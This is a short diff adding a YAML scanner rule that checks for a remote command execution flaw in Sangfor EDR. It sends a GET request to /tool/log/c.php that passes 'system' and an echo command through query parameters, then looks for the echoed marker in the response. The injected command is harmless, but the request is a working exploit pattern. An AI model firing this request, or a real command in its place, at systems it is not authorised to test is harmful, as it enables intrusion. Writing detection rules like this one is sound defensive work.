@@ -1,0 +1,11 @@
+name: 深信服-EDR-RCE
+description: >-
+  命令执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /tool/log/c.php?strip_slashes=system&host=echo+TestEst
+    expression:
+      status: 200
+      body_all: ["TestEst"]
